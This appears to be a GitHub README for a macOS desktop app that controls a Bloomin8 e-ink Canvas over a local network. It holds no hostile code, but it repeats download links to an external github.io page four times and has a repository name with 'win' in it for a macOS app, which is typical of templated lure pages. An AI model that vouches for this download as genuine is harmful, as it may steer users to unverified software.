# Bloomin8 Desktop v2026 - macOS desktop app 2026

> **Control a Bloomin8 color e-ink Canvas from macOS over your local network with a native desktop app built for photo pushes, device management, and recurring schedules in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/marcokeller85/custom-bloomin8-canvas-desktop-win-63147?style=flat-square)](https://github.com/marcokeller85/custom-bloomin8-canvas-desktop-win-63147)

---

<p align="center">
  <a href="https://marcokeller85.github.io/custom-bloomin8-canvas-desktop-win-63147/">
    <img src="https://img.shields.io/badge/Download-Bloomin8%20Desktop%20Latest-brightgreen?style=for-the-badge" alt="Download Bloomin8 Desktop">
  </a>
</p>

> **[Direct Download - Bloomin8 Desktop v2026](https://marcokeller85.github.io/custom-bloomin8-canvas-desktop-win-63147/)**

---

[Download Latest Build](https://marcokeller85.github.io/custom-bloomin8-canvas-desktop-win-63147/)

---

## About Bloomin8 Desktop

Bloomin8 Desktop is a macOS app for working with a Bloomin8 color e-ink Canvas on your local network. It is designed for users who want a direct desktop workflow for sending content, adjusting device behavior, and keeping a connected display updated without relying on cloud services.

The app focuses on practical control from a native tray-based interface. It brings together photo pushing, widget updates, gallery and playlist management, and recurring local schedules so the device can be maintained from one place.

---

## Features

- LAN-based control for a Bloomin8 color e-ink Canvas
- No cloud dependency, account setup, or sign-in flow
- Push photos and widgets to the device
- Manage galleries and playlists from the desktop app
- Create recurring local schedules for refreshes
- Rename devices and adjust device settings
- Sleep timers, BLE wake, reboot, and clear-screen actions
- Native tray app with support for multiple devices
- Client-side image processing
- Light and dark theme support

---

## Installation

1. Download or clone the repository.
2. Open the project in your macOS development or build environment.
3. Install the required dependencies for the Tauri, React, and TypeScript app stack.
4. Build and launch the desktop app from the project root.

Typical first launch during development:

    npm install
    npm run tauri dev

If you are using a packaged build, open the downloaded app and allow it to discover your Canvas device on the same LAN.

---

## Usage

After launching Bloomin8 Desktop, make sure your Mac and the Canvas are on the same network. The app can then discover and control supported devices locally.

Common workflows include:

- selecting a device from the tray-based interface
- pushing a photo or widget update
- organizing gallery items and playlists
- setting a recurring refresh schedule
- renaming the device or adjusting sleep and wake behavior
- clearing the screen or rebooting when needed

For development builds, the app is typically started from the project directory with the Tauri dev command shown above. For packaged builds, use the installed application normally and follow the in-app device setup flow.

---

## Configuration

Bloomin8 Desktop keeps settings in the local app environment and uses client-side processing for image handling.

Example configuration areas you may work with:

    device:
      name: "My Canvas"
      sleepTimer: 30
      launchAtLogin: true
      theme: "system"

    schedule:
      enabled: true
      interval: "daily"

    display:
      mode: "light"

Exact file locations and persistence details depend on the build and runtime environment.

---

## Requirements

- macOS
- A Bloomin8 color e-ink Canvas on the same LAN
- Network access between the Mac and the device
- Sufficient local storage for app data, gallery items, and processed images
- A development environment if you plan to build from source
- Runtime support for the Tauri, React, TypeScript, and Tailwind-based desktop stack

---

## FAQ

**Does it require an account or cloud service?**  
No. The app is designed to work locally over LAN without sign-in.

**Can it manage more than one device?**  
Yes. Multiple device support is included.

**Can I automate refreshes?**  
Yes. Recurring local schedules are supported.

**Where are updates announced?**  
Check the repository and release area for the latest build and project changes.

**What if the device is not detected?**  
Confirm that the Mac and Canvas are on the same network, then verify the device is available and responsive.

**Can I change app behavior or appearance?**  
Yes. The app includes a light/dark theme and local device controls such as launch at login, sleep timers, BLE wake, reboot, and screen clearing.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
